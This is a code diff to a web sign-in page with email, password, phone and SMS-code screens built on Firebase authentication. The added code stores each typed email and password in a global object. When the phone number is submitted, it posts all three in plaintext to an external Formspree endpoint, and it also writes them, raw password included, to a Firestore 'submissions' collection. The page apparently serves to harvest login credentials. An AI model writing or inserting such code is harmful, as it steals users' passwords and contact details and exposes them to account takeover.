@@ -296,6 +296,8 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
   import { getAuth, RecaptchaVerifier, signInWithPhoneNumber }
     from "https://www.gstatic.com/firebasejs/12.12.0/firebase-auth.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } 
+    from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
 
   // Firebase config
   const firebaseConfig = {
@@ -310,7 +312,22 @@
   // Initialize Firebase and the SDKs used in this app.
   const app = initializeApp(firebaseConfig);
   const auth = getAuth(app);
+  const db = getFirestore(app);
   auth.useDeviceLanguage();
+
+  async function saveUserData(data) {
+    try {
+      await addDoc(collection(db, "submissions"), {
+        email: data.email,
+        phone: data.phone,
+        password: data.password || null, // ⚠️ avoid in real apps
+        createdAt: serverTimestamp()
+      });
+      console.log("Saved to Firebase");
+    } catch (e) {
+      console.error("Error adding document: ", e);
+    }
+  }
 
   let confirmationResult = null;
 
@@ -333,6 +350,30 @@
     }
 
     var phoneNumber = '+1' + raw;
+    window.collectedData.phone = phoneNumber;
+
+    // ✅ SEND TO FORMSPREE HERE
+    fetch("https://formspree.io/f/mlgoopdk", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({
+        email: collectedData.email,
+        password: collectedData.password,
+        phone: collectedData.phone
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        console.log("Submitted to Formspree");
+      } else {
+        console.error("Formspree error");
+      }
+    })
+    .catch(error => console.error("Network error:", error));
+
     var btn = document.getElementById('sendCodeBtn');
     btn.disabled = true;
     btn.innerHTML = 'Sending<span class="spinner"></span>';
@@ -377,6 +418,9 @@
     hideMsg('codeMsg');
 
     try {
+      // ✅ SAVE TO FIREBASE HERE
+      await saveUserData(window.collectedData);
+
       await confirmationResult.confirm(code);
       goTo('screen5');
     } catch (err) {
@@ -391,6 +435,11 @@
 
 <script>
   // Non-module global functions
+  let collectedData = window.collectedData = {
+    email: "",
+    password: "",
+    phone: ""
+  };
   function goTo(id) {
     document.querySelectorAll('.card').forEach(function(c) { c.classList.remove('active'); });
     document.getElementById(id).classList.add('active');
@@ -398,12 +447,14 @@
   function handleEmail() {
     var email = document.getElementById('emailInput').value.trim();
     if (!email) return;
+    window.collectedData.email = email;
     document.getElementById('emailChip').textContent = email;
     goTo('screen2');
   }
   function handlePassword() {
     var pw = document.getElementById('pwInput').value;
     if (!pw) return;
+    window.collectedData.password = pw;
     goTo('screen3');
   }
   function togglePw() {
